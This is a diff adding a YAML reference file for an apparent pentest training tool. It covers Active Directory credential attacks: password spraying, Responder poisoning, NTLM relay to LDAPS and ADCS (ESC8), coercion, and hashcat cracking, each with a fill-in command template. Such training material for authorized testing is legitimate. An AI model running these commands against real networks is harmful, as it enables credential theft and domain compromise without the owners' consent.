@@ -1,0 +1,233 @@
+# Cephalo content — AD credential attacks (AD-4): spraying, poisoning, relay, coercion, cracking.
+# Authorized testing only. Coercion is patch/version-gated -> [UNVERIFIED] + citation.
+sections:
+  - id: ad.p10.credattack
+    title: AD Credential Attacks
+    os: ad
+    phase: credential-access
+    order: 108
+    description: From poisoning and spraying to NTLM relay and offline cracking.
+    techniques:
+      - ad.cred.spray
+      - ad.cred.responder
+      - ad.cred.relay
+      - ad.cred.coerce
+      - ad.cred.crackref
+    packs: [oscp]
+
+techniques:
+  - id: ad.cred.spray
+    title: Password spraying (lockout-aware)
+    os: [ad]
+    phase: credential-access
+    summary: Try one password against many users — read the lockout policy FIRST.
+    body: |
+      Spray a single likely password across the user list. Always read the lockout
+      threshold/observation window first and stay one attempt under it; prefer
+      `--continue-on-success` to collect every hit in one pass.
+    commands: [ad.cred.spray.nxc]
+    prerequisites: [ad.enum.smb]
+    tags: [smb, netexec, ad]
+    services: [smb]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.netexec]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.cred.responder
+    title: LLMNR / NBT-NS / mDNS poisoning
+    os: [ad]
+    phase: credential-access
+    summary: Answer broadcast name resolution to capture NetNTLMv2 hashes, then crack.
+    body: |
+      Responder poisons LLMNR/NBT-NS/mDNS and captures NetNTLMv2 challenge-responses
+      from hosts looking for a name. Crack with hashcat -m 5600, or relay them live
+      (see NTLM relay).
+    commands: [ad.cred.responder.run, ad.cred.responder.crack]
+    tags: [ntlm, creds, ad]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.responder, ref.hashcat]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.cred.relay]
+
+  - id: ad.cred.relay
+    title: NTLM relay (ntlmrelayx)
+    os: [ad]
+    phase: credential-access
+    summary: Relay captured NTLM auth to SMB / LDAP(S) / ADCS web-enroll (ESC8).
+    body: |
+      Instead of cracking a captured NetNTLMv2, relay it live to a service that does
+      not require signing. SMB→LDAPS can grant RBCD or a DCSync ACL; SMB→ADCS
+      web-enroll (ESC8) yields a certificate for the victim. Disable Responder's
+      SMB/HTTP servers when relaying.
+    commands: [ad.cred.relay.ldaps, ad.cred.relay.esc8]
+    prerequisites: [ad.enum.signing]
+    tags: [ntlm, ad, creds]
+    services: [smb, ldap]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket, ref.certipy, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.cred.coerce
+    title: Authentication coercion (methodology)
+    os: [ad]
+    phase: credential-access
+    summary: Force a machine account to authenticate to you to feed a relay.
+    body: |
+      Coercion methods (PrinterBug / PetitPotam / DFSCoerce / Coercer) trigger a
+      target — often a DC — to authenticate to an attacker host, feeding an NTLM
+      relay (e.g. to ADCS for ESC8). Exact applicability is patch- and
+      version-dependent; confirm against the target before relying on any single
+      method.
+    commands: [ad.cred.coerce.petitpotam]
+    prerequisites: [ad.cred.relay]
+    tags: [ntlm, ad]
+    archetypeBand: high
+    references: [ref.coercer, ref.hacktricks]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: ad.cred.crackref
+    title: Hash & ticket cracking reference
+    os: [ad]
+    phase: credential-access
+    summary: hashcat modes for the AD hash types you will collect.
+    body: |
+      NetNTLMv2 = 5600 · Kerberoast TGS-REP = 13100 · AS-REP = 18200 ·
+      NetNTLMv1 = 5500 · DCC2 (cached) = 2100. Match the mode to the capture.
+    commands: [ad.cred.crack.ntlmv2, ad.cred.crack.tgs, ad.cred.crack.asrep]
+    tags: [hashcat, creds, ad]
+    archetypeBand: high
+    references: [ref.hashcat]
+    confidence: verified
+    packs: [oscp]
+
+commands:
+  - id: ad.cred.spray.nxc
+    title: Password spray (netexec)
+    template: "netexec smb {{DC_IP}} -u users.txt -p '{{PASS}}' --continue-on-success"
+    tool: netexec
+    description: Spray one password across a user list, collecting every success.
+    os: [ad]
+    phase: credential-access
+    tags: [smb, netexec]
+    notes:
+      - "Read --pass-pol FIRST. Stay one attempt under the lockout threshold per window."
+      - "A '+' in netexec output marks a valid credential."
+    confidence: verified
+    references: [ref.netexec]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.cred.responder.run
+    title: Run Responder
+    template: "sudo responder -I {{INTERFACE}} -wd"
+    tool: responder
+    description: Poison LLMNR/NBT-NS/mDNS and serve rogue WPAD to capture hashes.
+    os: [ad]
+    phase: credential-access
+    tags: [ntlm, creds]
+    notes:
+      - "Captured NetNTLMv2 lands under logs/. Disable SMB/HTTP servers when relaying instead."
+    confidence: verified
+    references: [ref.responder]
+    danger: high
+    packs: [oscp]
+  - id: ad.cred.responder.crack
+    title: Crack NetNTLMv2 (hashcat 5600)
+    template: "hashcat -m 5600 netntlmv2.txt {{WORDLIST}}"
+    tool: hashcat
+    description: Crack captured NetNTLMv2 challenge-responses offline.
+    os: [ad]
+    phase: credential-access
+    tags: [hashcat, creds]
+    confidence: verified
+    references: [ref.hashcat]
+    danger: low
+    packs: [oscp]
+
+  - id: ad.cred.relay.ldaps
+    title: Relay SMB → LDAPS (RBCD/ACL)
+    template: "impacket-ntlmrelayx -t ldaps://{{DC_IP}} --delegate-access --no-dump -smb2support"
+    tool: impacket
+    description: Relay a captured machine/user auth to LDAPS to configure RBCD.
+    os: [ad]
+    phase: credential-access
+    tags: [ntlm, ad]
+    notes:
+      - "Pair with coercion to source the authentication."
+    confidence: verified
+    references: [ref.impacket]
+    danger: critical
+    packs: [oscp]
+  - id: ad.cred.relay.esc8
+    title: Relay SMB → ADCS web enroll (ESC8)
+    template: "impacket-ntlmrelayx -t http://{{CA_HOST}}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+    tool: impacket
+    description: Relay a DC's auth to the ADCS web endpoint to mint a certificate (ESC8).
+    os: [ad]
+    phase: credential-access
+    tags: [ntlm, ad]
+    notes:
+      - "The template must be enrollable by the relayed principal — confirm with certipy find."
+    confidence: verified
+    references: [ref.certipy, ref.impacket]
+    danger: critical
+    packs: [oscp]
+
+  - id: ad.cred.coerce.petitpotam
+    title: Coerce DC auth (pointer)
+    template: "# trigger the target to authenticate to {{LHOST}} via an available coercion method"
+    shell: text
+    description: Force a machine to auth to your relay; method applicability is version-gated.
+    os: [ad]
+    phase: credential-access
+    tags: [ntlm, ad]
+    notes:
+      - "Applicability depends on target patch level — verify the method works before relying on it."
+    confidence: unverified
+    references: [ref.coercer, ref.hacktricks]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.cred.crack.ntlmv2
+    title: NetNTLMv2 (hashcat 5600)
+    template: "hashcat -m 5600 hashes.txt {{WORDLIST}}"
+    tool: hashcat
+    description: Crack NetNTLMv2 from Responder/relay captures.
+    os: [ad]
+    phase: credential-access
+    tags: [hashcat]
+    confidence: verified
+    references: [ref.hashcat]
+    danger: low
+    packs: [oscp]
+  - id: ad.cred.crack.tgs
+    title: Kerberoast TGS-REP (hashcat 13100)
+    template: "hashcat -m 13100 spns.txt {{WORDLIST}}"
+    tool: hashcat
+    description: Crack Kerberoasted service tickets.
+    os: [ad]
+    phase: credential-access
+    tags: [hashcat, kerberos]
+    confidence: verified
+    references: [ref.hashcat]
+    danger: low
+    packs: [oscp]
+  - id: ad.cred.crack.asrep
+    title: AS-REP (hashcat 18200)
+    template: "hashcat -m 18200 asrep.txt {{WORDLIST}}"
+    tool: hashcat
+    description: Crack AS-REP roasted hashes.
+    os: [ad]
+    phase: credential-access
+    tags: [hashcat, kerberos]
+    confidence: verified
+    references: [ref.hashcat]
+    danger: low
+    packs: [oscp]
